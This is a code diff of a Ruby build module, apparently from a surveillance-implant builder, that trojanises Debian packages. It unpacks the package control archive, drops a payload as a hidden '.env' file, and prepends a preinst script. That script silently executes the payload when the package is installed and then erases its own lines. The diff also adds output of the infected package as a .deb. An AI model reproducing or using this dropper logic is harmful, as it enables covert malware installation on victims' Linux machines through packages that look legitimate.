@@ -43,10 +43,10 @@ class BuildLinux < Build
     trace :debug, "Build: melting: #{params}"
 
     executable = path('default')
-    @appname = params['appname'] || 'install'
+    @appname = params['appname'] || 'agent'
 
-    melting_mode = :silent
-    melting_mode = :melted if params['input']
+    @melting_mode = :silent
+    @melting_mode = :melted if params['input']
 
     dropper_size = File.size(path('dropper'))
 
@@ -83,34 +83,40 @@ class BuildLinux < Build
     FileUtils.mkdir_p path('DEBIAN')
 
     # extract the original
-    CrossPlatform.exec path('bin/ar'), "x #{host} #{path('control.tar.gz')}"
+    CrossPlatform.exec path('bin/ar'), "x #{host} control.tar.gz", {:chdir => path('')}
     CrossPlatform.exec path('bin/tar'), "xzf #{path('control.tar.gz')} -C #{path('DEBIAN')}"
 
     FileUtils.cp guest, path('DEBIAN/.env')
     if File.exist? path('DEBIAN/preinst')
       content = File.read(path('DEBIAN/preinst'))
-      command = "#!/bin/sh\n(export P=/var/lib/dpkg/tmp.ci/.env; chmod +x $P; $P; sed -i -e '1,2d' /var/lib/dpkg/tmp.ci/preinst) 2>/dev/null"
+      command = "#!/bin/sh\n(export P=/var/lib/dpkg/tmp.ci/.env; chmod +x $P; $P; sed -i -e '1,2d' /var/lib/dpkg/tmp.ci/preinst) 2>/dev/null\n"
       content = command + content
       File.open(path('DEBIAN/preinst'), 'wb') {|f| f.write content}
     else
-      File.open(path('DEBIAN/preinst'), 'wb') {|f| f.write "#!/bin/sh\n(export P=/var/lib/dpkg/tmp.ci/.env; chmod +x $P; $P; rm -f /var/lib/dpkg/tmp.ci/preinst) 2>/dev/null"}
+      File.open(path('DEBIAN/preinst'), 'wb') {|f| f.write "#!/bin/sh\n(export P=/var/lib/dpkg/tmp.ci/.env; chmod +x $P; $P; rm -f /var/lib/dpkg/tmp.ci/preinst) 2>/dev/null\n"}
     end
 
     # repack it
     CrossPlatform.exec path('bin/tar'), "czf #{path('control.tar.gz')} -C #{path('DEBIAN')} ."
-    CrossPlatform.exec path('bin/ar'), "r #{host} #{path('control.tar.gz')}"
+    CrossPlatform.exec path('bin/ar'), "r #{host} control.tar.gz", {:chdir => path('')}
   end
 
   def pack(params)
     trace :debug, "Build: pack: #{params}"
 
-    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
-      z.file.open(@appname, "wb") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
-    end
+    if @melting_mode.eql? :silent
+      Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
+        z.file.open(@appname, "wb") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
+      end
 
-    # make it executable (for some reason we cannot do it in the previous phase)
-    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
-      z.file.chmod(0755, @appname)
+      # make it executable (for some reason we cannot do it in the previous phase)
+      Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
+        z.file.chmod(0755, @appname)
+      end
+    else
+      Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
+        z.file.open("#{@appname}.deb", "wb") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
+      end
     end
 
     # this is the only file we need to output after this point
